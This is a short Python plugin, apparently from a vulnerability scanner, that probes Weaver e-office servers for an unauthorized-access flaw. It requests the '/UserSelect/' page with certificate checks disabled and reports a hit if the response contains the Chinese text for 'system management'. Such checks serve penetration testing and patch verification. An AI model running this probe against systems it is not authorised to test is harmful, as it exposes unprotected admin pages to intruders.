import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def Weaver_e_office_userlogin(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    vuln_url = urldata + "/UserSelect/"
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.get(vuln_url, headers=headers, verify=False)
        if url.status_code == 200 and '系统管理' in url.text:
            print(Vcolors.RED + "[!] 泛微未授权访问漏洞:{}".format(vuln_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微未授权访问漏洞" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n", e)
        logging.error("Weaver_e_office_userlogin脚本出现异常")



